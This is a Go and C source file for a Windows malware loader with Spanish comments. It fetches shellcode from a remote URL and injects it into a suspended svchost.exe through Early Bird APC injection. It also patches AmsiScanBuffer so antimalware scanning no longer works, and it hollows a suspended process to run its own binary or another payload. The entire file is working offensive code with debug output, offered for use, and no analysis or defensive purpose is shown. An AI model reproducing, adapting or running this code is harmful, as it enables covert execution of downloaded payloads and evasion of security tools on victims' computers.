// loader_windows.go
//go:build windows

package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"regexp"
	"syscall"
	"time"
	"unsafe"
    "strings"
    "encoding/hex"

	"golang.org/x/sys/windows"
)

/*
#cgo LDFLAGS: -lkernel32 -lntdll
#include <windows.h>
#include <stdio.h>

typedef long NTSTATUS;
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS 0x00000000L
#endif

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *NtWriteVirtualMemory_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS (NTAPI *NtQueueApcThread_t)(HANDLE, PAPCFUNC, PVOID, PVOID, PVOID);

// Añadido: para evitar warnings
#ifndef WIN64
#define WIN64 1
#endif

BOOL EarlyBirdInject(unsigned char* shellcode, int shellcode_len) {
    if (shellcode == NULL || shellcode_len <= 0) {
        printf("[-] Invalid shellcode\n");
        return FALSE;
    }

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(STARTUPINFOA);
    char target[] = "C:\\Windows\\System32\\svchost.exe";

    if (!CreateProcessA(NULL, target, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcessA failed: %lu\n", GetLastError());
        return FALSE;
    }

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        printf("[-] Failed to get ntdll\n");
        goto cleanup;
    }

    NtAllocateVirtualMemory_t pAlloc = (NtAllocateVirtualMemory_t)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
    NtWriteVirtualMemory_t    pWrite = (NtWriteVirtualMemory_t)   GetProcAddress(ntdll, "NtWriteVirtualMemory");
    NtQueueApcThread_t        pApc   = (NtQueueApcThread_t)       GetProcAddress(ntdll, "NtQueueApcThread");

    if (!pAlloc || !pWrite || !pApc) {
        printf("[-] Failed to get Nt* functions\n");
        goto cleanup;
    }

    LPVOID pRemoteMem = NULL;
    SIZE_T size = (SIZE_T)shellcode_len;

    if (!NT_SUCCESS(pAlloc(pi.hProcess, &pRemoteMem, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))) {
        printf("[-] NtAllocateVirtualMemory failed\n");
        goto cleanup;
    }

    if (!NT_SUCCESS(pWrite(pi.hProcess, pRemoteMem, shellcode, shellcode_len, NULL))) {
        printf("[-] NtWriteVirtualMemory failed\n");
        goto cleanup;
    }

    if (!NT_SUCCESS(pApc(pi.hThread, (PAPCFUNC)pRemoteMem, NULL, NULL, NULL))) {
        printf("[-] NtQueueApcThread failed\n");
        goto cleanup;
    }

    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        printf("[-] ResumeThread failed: %lu\n", GetLastError());
        goto cleanup;
    }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return TRUE;

cleanup:
    if (pi.hThread) CloseHandle(pi.hThread);
    if (pi.hProcess) TerminateProcess(pi.hProcess, 1);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    return FALSE;
}
*/
import "C"


const (
    IMAGE_DOS_SIGNATURE              = 0x5A4D
    IMAGE_NT_SIGNATURE               = 0x00004550
    IMAGE_NT_OPTIONAL_HDR32_MAGIC    = 0x10b
    IMAGE_NT_OPTIONAL_HDR64_MAGIC    = 0x20b
    IMAGE_SIZEOF_SHORT_NAME          = 8
    IMAGE_NUMBEROF_DIRECTORY_ENTRIES = 16
)

type IMAGE_DOS_HEADER struct {
    Signature uint16
    _         [58]byte
    LFANew    uint32
}

type IMAGE_FILE_HEADER struct {
    Machine              uint16
    NumberOfSections     uint16
    TimeDateStamp        uint32
    PointerToSymbolTable uint32
    NumberOfSymbols      uint32
    SizeOfOptionalHeader uint16
    Characteristics      uint16
}

type IMAGE_DATA_DIRECTORY struct {
    VirtualAddress uint32
    Size           uint32
}

type IMAGE_OPTIONAL_HEADER32 struct {
    Magic                       uint16
    MajorLinkerVersion          byte
    MinorLinkerVersion          byte
    SizeOfCode                  uint32
    SizeOfInitializedData       uint32
    SizeOfUninitializedData     uint32
    AddressOfEntryPoint         uint32
    BaseOfCode                  uint32
    ImageBase                   uint32
    SectionAlignment            uint32
    FileAlignment               uint32
    MajorOperatingSystemVersion uint16
    MinorOperatingSystemVersion uint16
    MajorImageVersion           uint16
    MinorImageVersion           uint16
    MajorSubsystemVersion       uint16
    MinorSubsystemVersion       uint16
    Win32VersionValue           uint32
    SizeOfImage                 uint32
    SizeOfHeaders               uint32
    CheckSum                    uint32
    Subsystem                   uint16
    DllCharacteristics          uint16
    SizeOfStackReserve          uint32
    SizeOfStackCommit           uint32
    SizeOfHeapReserve           uint32
    SizeOfHeapCommit            uint32
    LoaderFlags                 uint32
    NumberOfRvaAndSizes         uint32
    DataDirectory               [IMAGE_NUMBEROF_DIRECTORY_ENTRIES]IMAGE_DATA_DIRECTORY
}

type IMAGE_OPTIONAL_HEADER64 struct {
    Magic                       uint16
    MajorLinkerVersion          byte
    MinorLinkerVersion          byte
    SizeOfCode                  uint32
    SizeOfInitializedData       uint32
    SizeOfUninitializedData     uint32
    AddressOfEntryPoint         uint32
    BaseOfCode                  uint32
    ImageBase                   uint64
    SectionAlignment            uint32
    FileAlignment               uint32
    MajorOperatingSystemVersion uint16
    MinorOperatingSystemVersion uint16
    MajorImageVersion           uint16
    MinorImageVersion           uint16
    MajorSubsystemVersion       uint16
    MinorSubsystemVersion       uint16
    Win32VersionValue           uint32
    SizeOfImage                 uint32
    SizeOfHeaders               uint32
    CheckSum                    uint32
    Subsystem                   uint16
    DllCharacteristics          uint16
    SizeOfStackReserve          uint64
    SizeOfStackCommit           uint64
    SizeOfHeapReserve           uint64
    SizeOfHeapCommit            uint64
    LoaderFlags                 uint32
    NumberOfRvaAndSizes         uint32
    DataDirectory               [IMAGE_NUMBEROF_DIRECTORY_ENTRIES]IMAGE_DATA_DIRECTORY
}

type IMAGE_NT_HEADERS32 struct {
    Signature      uint32
    FileHeader     IMAGE_FILE_HEADER
    OptionalHeader IMAGE_OPTIONAL_HEADER32
}

type IMAGE_NT_HEADERS64 struct {
    Signature      uint32
    FileHeader     IMAGE_FILE_HEADER
    OptionalHeader IMAGE_OPTIONAL_HEADER64
}

type IMAGE_SECTION_HEADER struct {
    Name                 [IMAGE_SIZEOF_SHORT_NAME]byte
    Misc                 uint32
    VirtualAddress       uint32
    SizeOfRawData        uint32
    PointerToRawData     uint32
    PointerToLinenumbers uint32
    NumberOfRelocations  uint16
    NumberOfLinenumbers  uint16
    Characteristics      uint32
}

var (
    ntdll          = syscall.NewLazyDLL("ntdll.dll")
    procGetContext = ntdll.NewProc("NtGetContextThread")
    procSetContext = ntdll.NewProc("NtSetContextThread")
    procQueryInfo  = ntdll.NewProc("NtQueryInformationProcess")
)

type CONTEXT struct {
    ContextFlags uint32
    _            [4]byte
    Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi, R8, R9, R10, R11, R12, R13, R14, R15 uint64
    EFlags                                                              uint32
    _                                                                   [4]byte
}

type WOW64_CONTEXT struct {
    ContextFlags uint32
    Dr0, Dr1, Dr2, Dr3, Dr6, Dr7 uint32
    Eax, Ecx, Edx, Ebx, Esp, Ebp, Esi, Edi uint32
    EFlags uint32
}

type PEB struct {
    InheritedAddressSpace    uint8
    ReadImageFileExecOptions uint8
    BeingDebugged            uint8
    BitField                 uint8
    _                        [4]byte
    ImageBaseAddress         uint64
}

type PROCESS_BASIC_INFORMATION struct {
    Reserved1           uintptr
    PebBaseAddress      *PEB
    Reserved2           [2]uintptr
    UniqueProcessId     uintptr
    Reserved3           uintptr
}

func executeLoader(shellcodeURL string) {
	fmt.Printf("[*] Downloading shellcode from: %s\n", shellcodeURL)
	shellcode, err := readShellcodeFromURL(shellcodeURL) // Usamos tu función de Go
	if err != nil {
		fmt.Printf("[-] Failed to download or parse shellcode: %v\n", err)
		return
	}

	if len(shellcode) == 0 {
		fmt.Printf("[-] No shellcode bytes found after parsing.\n")
		return
	}

	fmt.Printf("[+] Shellcode downloaded and parsed successfully (%d bytes). Injecting via Early Bird APC...\n", len(shellcode))

	// Pasamos el shellcode a la función C para la inyección
	success := C.EarlyBirdInject((*C.uchar)(unsafe.Pointer(&shellcode[0])), C.int(len(shellcode)))

	if success != 0 {
		fmt.Println("[+] Early Bird APC injection reported success.")
	} else {
		fmt.Println("[-] Early Bird APC injection reported failure.")
	}
}

func readShellcodeFromURL(url string) ([]byte, error) {
	client := &http.Client{Timeout: 15 * time.Second}
	resp, err := client.Get(url)
	if err != nil {
		return nil, fmt.Errorf("error connecting: %v", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("error reading body: %v", err)
	}

	content := string(body)

	re := regexp.MustCompile(`buf\[\]\s*=\s*(?:"(?:[^"\\]|\\.)*"(?:\s*")?(?:[^"]*)?)*;`)
	match := re.FindString(content)
	if match == "" {
		return nil, fmt.Errorf("no shellcode pattern found")
	}

	reChunks := regexp.MustCompile(`"((?:[^"\\]|\\.)*)"`)
	chunks := reChunks.FindAllStringSubmatch(match, -1)

	var hexBuilder strings.Builder
	for _, chunk := range chunks {
		if len(chunk) < 2 {
			continue
		}
		clean := strings.ReplaceAll(chunk[1], "\\x", "")
		hexBuilder.WriteString(clean)
	}

	hexStr := hexBuilder.String()


	if len(hexStr)%2 != 0 {
		return nil, fmt.Errorf("hex string has odd length")
	}

	shellcode, err := hex.DecodeString(hexStr)
	if err != nil {
		return nil, fmt.Errorf("failed to decode hex: %v. First 100 chars: %s", err, hexStr[:min(100, len(hexStr))])
	}

	if len(shellcode) == 0 {
		return nil, fmt.Errorf("shellcode is empty after parsing")
	}

	fmt.Printf("[+] Shellcode parsed successfully: %d bytes\n", len(shellcode))
	return shellcode, nil
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}


func patchAMSI() error {
	amsi, err := syscall.LoadLibrary("amsi.dll")
	if err != nil {
		return fmt.Errorf("failed to load amsi.dll: %v", err)
	}
	defer syscall.FreeLibrary(amsi)

	scanBufferAddr, err := syscall.GetProcAddress(amsi, "AmsiScanBuffer")
	if err != nil {
		return fmt.Errorf("failed to get AmsiScanBuffer address: %v", err)
	}

	patch := []byte{0xc3}

	var hProcess windows.Handle
	hProcess, err = windows.OpenProcess(windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE, false, windows.GetCurrentProcessId())
	if err != nil {
		return fmt.Errorf("failed to open process: %v", err)
	}
	defer windows.CloseHandle(hProcess)

	var oldProtect uint32
	var size uintptr = 1
	err = windows.VirtualProtectEx(
		hProcess,
		uintptr(unsafe.Pointer(scanBufferAddr)),
		size,
		windows.PAGE_EXECUTE_READWRITE,
		&oldProtect,
	)
	if err != nil {
		return fmt.Errorf("failed to change memory protection: %v", err)
	}

	var bytesWritten uintptr
	err = windows.WriteProcessMemory(
		hProcess,
		uintptr(unsafe.Pointer(scanBufferAddr)),
		&patch[0],
		size,
		&bytesWritten,
	)
	if err != nil {
		return fmt.Errorf("failed to write memory: %v", err)
	}

	err = windows.VirtualProtectEx(
		hProcess,
		uintptr(unsafe.Pointer(scanBufferAddr)),
		size,
		oldProtect,
		&oldProtect,
	)
	if err != nil {
		return fmt.Errorf("failed to restore memory protection: %v", err)
	}

	fmt.Println("[+] AMSI patched: AmsiScanBuffer replaced with ret")
	return nil
}

func overWrite(targetPath, payloadPath string) {
    fmt.Printf("[*] Starting migration to: %s\n", targetPath)

    var exeData []byte
    var err error

    if payloadPath == "" {
        exePath, err := os.Executable()
        if err != nil {
            fmt.Printf("[-] Failed to get executable path: %v\n", err)
            return
        }

        exeData, err = os.ReadFile(exePath)
        if err != nil {
            fmt.Printf("[-] Failed to read own binary: %v\n", err)
            return
        }
        fmt.Printf("[+] Loaded self as payload (%d bytes)\n", len(exeData))
    } else {
        exeData, err = os.ReadFile(payloadPath)
        if err != nil {
            fmt.Printf("[-] Failed to read payload file %s: %v\n", payloadPath, err)
            return
        }
        fmt.Printf("[+] Loaded payload from file (%d bytes)\n", len(exeData))
    }

    payloadImage, err := peBufferToVirtualImage(exeData)
    if err != nil {
        fmt.Printf("[-] Failed to map payload to virtual image: %v\n", err)
        return
    }
    payloadImageSize := uint32(len(payloadImage))
    fmt.Printf("[+] Payload image size: %d\n", payloadImageSize)

    targetData, err := os.ReadFile(targetPath)
    if err != nil {
        fmt.Printf("[-] Failed to read target file: %v\n", err)
        return
    }

    isPayload32bit := !is64Bit(exeData)
    isTarget32bit := !is64Bit(targetData)
    targetImageSize := getImageSize(targetData)

    if isPayload32bit != isTarget32bit {
        fmt.Printf("[-] Architecture mismatch: payload is %s, target is %s\n",
            boolStr(isPayload32bit, "32-bit", "64-bit"),
            boolStr(isTarget32bit, "32-bit", "64-bit"))
        return
    }
    fmt.Printf("[+] Payload and Target architecture match (%s)\n", boolStr(isPayload32bit, "32-bit", "64-bit"))

    if payloadImageSize > targetImageSize {
        fmt.Printf("[-] Payload size (%d) exceeds target image size (%d)\n", payloadImageSize, targetImageSize)
        return
    }
    fmt.Printf("[+] Size compatible: %d <= %d\n", payloadImageSize, targetImageSize)

    var si windows.StartupInfo
    var pi windows.ProcessInformation
    si.Cb = uint32(unsafe.Sizeof(si))

    argv := windows.StringToUTF16Ptr(targetPath)
    err = windows.CreateProcess(nil, argv, nil, nil, false, windows.CREATE_SUSPENDED, nil, nil, &si, &pi)
    if err != nil {
        fmt.Printf("[-] CreateProcess failed: %v\n", err)
        return
    }
    defer windows.CloseHandle(pi.Process)
    defer windows.CloseHandle(pi.Thread)

    fmt.Printf("[+] Suspended process created. PID: %d\n", pi.ProcessId)

    remoteBase, err := getRemoteImageBase(&pi, isPayload32bit)
    if err != nil {
        fmt.Printf("[-] Failed to get remote image base: %v\n", err)
        return
    }
    fmt.Printf("[+] Remote image base: 0x%X\n", remoteBase)

    var oldProtect uint32
    err = windows.VirtualProtectEx(pi.Process, uintptr(remoteBase), uintptr(payloadImageSize), windows.PAGE_EXECUTE_READWRITE, &oldProtect)
    if err != nil {
        fmt.Printf("[-] VirtualProtectEx failed: %v\n", err)
        return
    }

    var written uint32
    err = windows.WriteProcessMemory(pi.Process, uintptr(remoteBase), &payloadImage[0], uintptr(payloadImageSize), (*uintptr)(unsafe.Pointer(&written)))
    if err != nil || written != payloadImageSize {
        fmt.Printf("[-] WriteProcessMemory failed: %v, written=%d\n", err, written)
        return
    }
    fmt.Printf("[+] Successfully wrote %d bytes into remote process\n", written)

    entryPointRVA := getEntryPointRVA(exeData)
    entryPointVA := remoteBase + uint64(entryPointRVA)

    err = updateRemoteEntryPoint(&pi, entryPointVA, isPayload32bit)
    if err != nil {
        fmt.Printf("[-] Failed to update thread context: %v\n", err)
        return
    }
    fmt.Printf("[+] Thread context updated to entry point: 0x%X\n", entryPointVA)

    _, err = windows.ResumeThread(pi.Thread)
    if err != nil {
        fmt.Printf("[-] ResumeThread failed: %v\n", err)
        return
    }
    fmt.Printf("[+] Process resumed. Migration successful!\n")

}

func getNTHeaders(data []byte) unsafe.Pointer {
    if len(data) < int(unsafe.Sizeof(IMAGE_DOS_HEADER{})) {
        return nil
    }
    dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(&data[0]))
    if dosHeader.Signature != IMAGE_DOS_SIGNATURE {
        return nil
    }
    ntHeaderOffset := dosHeader.LFANew
    if int(ntHeaderOffset)+4 >= len(data) {
        return nil
    }
    ntSig := *(*uint32)(unsafe.Pointer(&data[ntHeaderOffset]))
    if ntSig != IMAGE_NT_SIGNATURE {
        return nil
    }
    return unsafe.Pointer(&data[ntHeaderOffset])
}

func is64Bit(data []byte) bool {
    ntPtr := getNTHeaders(data)
    if ntPtr == nil {
        return false
    }
    magic := *(*uint16)(unsafe.Pointer(uintptr(ntPtr) + 24))
    return magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC
}

func getImageSize(data []byte) uint32 {
    ntPtr := getNTHeaders(data)
    if ntPtr == nil {
        return 0
    }
    if is64Bit(data) {
        return (*IMAGE_NT_HEADERS64)(ntPtr).OptionalHeader.SizeOfImage
    } else {
        return (*IMAGE_NT_HEADERS32)(ntPtr).OptionalHeader.SizeOfImage
    }
}

func getEntryPointRVA(data []byte) uint32 {
    ntPtr := getNTHeaders(data)
    if ntPtr == nil {
        return 0
    }
    if is64Bit(data) {
        return (*IMAGE_NT_HEADERS64)(ntPtr).OptionalHeader.AddressOfEntryPoint
    } else {
        return (*IMAGE_NT_HEADERS32)(ntPtr).OptionalHeader.AddressOfEntryPoint
    }
}

func peBufferToVirtualImage(rawData []byte) ([]byte, error) {
    ntPtr := getNTHeaders(rawData)
    if ntPtr == nil {
        return nil, fmt.Errorf("invalid PE headers")
    }

    var sizeOfImage, sizeOfHeaders uint32
    var numberOfSections uint16

    if is64Bit(rawData) {
        nt := (*IMAGE_NT_HEADERS64)(ntPtr)
        sizeOfImage = nt.OptionalHeader.SizeOfImage
        sizeOfHeaders = nt.OptionalHeader.SizeOfHeaders
        numberOfSections = nt.FileHeader.NumberOfSections
    } else {
        nt := (*IMAGE_NT_HEADERS32)(ntPtr)
        sizeOfImage = nt.OptionalHeader.SizeOfImage
        sizeOfHeaders = nt.OptionalHeader.SizeOfHeaders
        numberOfSections = nt.FileHeader.NumberOfSections
    }

    if sizeOfImage == 0 || sizeOfImage > 100<<20 {
        return nil, fmt.Errorf("invalid image size: %d", sizeOfImage)
    }

    image := make([]byte, sizeOfImage)
    copy(image, rawData[:sizeOfHeaders])

    sectionHeaderOffset := uintptr(ntPtr) + 24 + unsafe.Sizeof(IMAGE_FILE_HEADER{}) + unsafe.Sizeof(IMAGE_OPTIONAL_HEADER32{})
    if is64Bit(rawData) {
        sectionHeaderOffset += unsafe.Sizeof(IMAGE_OPTIONAL_HEADER64{}) - unsafe.Sizeof(IMAGE_OPTIONAL_HEADER32{})
    }

    sections := (*[100]IMAGE_SECTION_HEADER)(unsafe.Pointer(sectionHeaderOffset))

    for i := 0; i < int(numberOfSections); i++ {
        sec := &sections[i]
        if sec.PointerToRawData == 0 || sec.SizeOfRawData == 0 {
            continue
        }
        dstStart := int(sec.VirtualAddress)
        dstEnd := dstStart + int(sec.SizeOfRawData)
        srcStart := int(sec.PointerToRawData)
        srcEnd := srcStart + int(sec.SizeOfRawData)

        if dstEnd > len(image) || srcEnd > len(rawData) {
            continue
        }
        copy(image[dstStart:dstEnd], rawData[srcStart:srcEnd])
    }

    return image, nil
}

func getRemoteImageBase(pi *windows.ProcessInformation, is32bitTarget bool) (uint64, error) {
    var pebAddr uint64

    if is32bitTarget {
        var ctx WOW64_CONTEXT
        ctx.ContextFlags = 0x10007
        r1, _, err := procGetContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx)))
        if r1 == 0 {
            pebAddr = uint64(ctx.Ebx)
            fmt.Printf("[DEBUG] WOW64: Ebx = 0x%X\n", ctx.Ebx)
        } else {
            fmt.Printf("[DEBUG] Wow64GetThreadContext failed: %v (NTSTATUS: 0x%X)\n", err, r1)
        }
    } else {
        var ctx CONTEXT
        ctx.ContextFlags = 0x100000
        r1, _, err := procGetContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx)))
        if r1 == 0 {
            pebAddr = ctx.Rdx
            fmt.Printf("[DEBUG] x64: Rdx = 0x%X\n", ctx.Rdx)
        } else {
            fmt.Printf("[DEBUG] GetThreadContext failed: %v (NTSTATUS: 0x%X)\n", err, r1)
        }
    }

    if pebAddr != 0 {
        fmt.Printf("[DEBUG] PEB address from context: 0x%X\n", pebAddr)
        offset := uint64(0x10)
        if is32bitTarget {
            offset = 0x8
        }
        var imageBase uint64
        var n uint32
        err := windows.ReadProcessMemory(
            pi.Process,
            uintptr(pebAddr + offset),
            (*byte)(unsafe.Pointer(&imageBase)),
            uintptr(unsafe.Sizeof(imageBase)),
            (*uintptr)(unsafe.Pointer(&n)),
        )
        if err == nil && n == uint32(unsafe.Sizeof(imageBase)) && imageBase != 0 {
            fmt.Printf("[+] Got ImageBase from PEB: 0x%X\n", imageBase)
            return imageBase, nil
        }
        fmt.Printf("[DEBUG] Failed to read ImageBase from PEB: %v, n=%d, value=0x%X\n", err, n, imageBase)
    } else {
        fmt.Printf("[DEBUG] PEB address from context is 0, falling back to NtQueryInformationProcess\n")
    }

	var pbi PROCESS_BASIC_INFORMATION
	var retLen uint32

	fmt.Printf("[DEBUG] Calling NtQueryInformationProcess...\n")
	r1, _, err := procQueryInfo.Call(
		uintptr(pi.Process),
		0,
		uintptr(unsafe.Pointer(&pbi)),
		uintptr(unsafe.Sizeof(pbi)),
		uintptr(unsafe.Pointer(&retLen)),
	)
	if r1 != 0 {
		return 0, fmt.Errorf("NtQueryInformationProcess failed: %v (NTSTATUS: 0x%X)", err, r1)
	}
	fmt.Printf("[DEBUG] NtQueryInformationProcess succeeded\n")

	if pbi.PebBaseAddress == nil {
		return 0, fmt.Errorf("PebBaseAddress is null")
	}
	fmt.Printf("[DEBUG] PebBaseAddress: %p\n", pbi.PebBaseAddress)

	remotePebAddr := uintptr(unsafe.Pointer(pbi.PebBaseAddress))
	remoteImageBaseAddr := remotePebAddr + 0x10

	var imageBase uint64
	var n uint32
	err = windows.ReadProcessMemory(
		pi.Process,
		remoteImageBaseAddr,
		(*byte)(unsafe.Pointer(&imageBase)),
		uintptr(unsafe.Sizeof(imageBase)),
		(*uintptr)(unsafe.Pointer(&n)),
	)
	if err != nil || n != uint32(unsafe.Sizeof(imageBase)) {
		return 0, fmt.Errorf("failed to read ImageBaseAddress from remote PEB: %v", err)
	}
	if imageBase == 0 {
		return 0, fmt.Errorf("remote ImageBaseAddress is 0")
	}

	fmt.Printf("[+] Successfully read remote ImageBase: 0x%X\n", imageBase)
	return imageBase, nil
}

func updateRemoteEntryPoint(pi *windows.ProcessInformation, entryPointVA uint64, is32bitTarget bool) error {
    if is32bitTarget {
        var ctx WOW64_CONTEXT
        ctx.ContextFlags = 0x10007

        r1, _, err := procGetContext.Call(
            uintptr(pi.Thread),
            uintptr(unsafe.Pointer(&ctx)),
        )
        if r1 != 0 {
            return fmt.Errorf("Wow64GetThreadContext failed: %v", err)
        }

        ctx.Eax = uint32(entryPointVA)

        r1, _, err = procSetContext.Call(
            uintptr(pi.Thread),
            uintptr(unsafe.Pointer(&ctx)),
        )
        if r1 != 0 {
            return fmt.Errorf("Wow64SetThreadContext failed: %v", err)
        }
    } else {
        var ctx CONTEXT
        ctx.ContextFlags = 0x100000

        r1, _, err := procGetContext.Call(
            uintptr(pi.Thread),
            uintptr(unsafe.Pointer(&ctx)),
        )
        if r1 != 0 {
            return fmt.Errorf("GetThreadContext failed: %v", err)
        }

        ctx.Rcx = entryPointVA

        r1, _, err = procSetContext.Call(
            uintptr(pi.Thread),
            uintptr(unsafe.Pointer(&ctx)),
        )
        if r1 != 0 {
            return fmt.Errorf("SetThreadContext failed: %v", err)
        }
    }

    return nil
}

func boolStr(b bool, t, f string) string {
    if b {
        return t
    }
    return f
}